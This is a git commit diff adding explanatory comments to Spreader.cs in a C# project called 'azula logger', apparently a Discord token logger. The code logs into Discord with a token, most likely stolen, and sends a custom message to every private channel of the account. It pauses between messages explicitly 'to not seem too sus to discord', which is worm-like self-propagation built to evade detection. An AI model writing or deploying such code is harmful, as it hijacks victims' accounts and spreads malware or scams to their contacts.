eb17d227e290d54ccf0bd68967c70514f654467a
Chefkoch69 <62508964+Chefkochhh@users.noreply.github.com>
2020-10-31 17:37:26 +0100

    Added some comments to Spreader.cs

--- azula logger/Spreader.cs
+++ azula logger/Spreader.cs
@@ -11,9 +11,10 @@ namespace azula_logger
 {
     public static class Spreader
     {
-
+        //using this for the message cus the other stuff was kinda gae
         public static string message()
         {
+            //you can replace your-Message with a custom message
             string msg = "your-Message";
 
             return msg;
@@ -27,25 +28,34 @@ namespace azula_logger
 
         public static void spread(string token )
         {
+            //making the client
             DiscordSocketClient client = new DiscordSocketClient();
             try
             {
+                //logging in with the token
                 client.Login(token);
+                //making a Listener to when the client is logged in
                 client.OnLoggedIn += Client_OnLoggedIn;
+
+                //waiting till the listener is toggled
+                Thread.Sleep(-1);
 
             }
             catch { }            
 
             
         }
-
+        //when its logged in its gonna call this code
         private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
         {
             try
             {
+                //grabbing all dms the client has
                 foreach (var dm in client.GetPrivateChannels())
                 {
+                    //waiting a bit to not seem too sus to discord
                     Thread.Sleep(69);
+                    //sending the message
                     dm.SendMessage(message());
                 }
             }
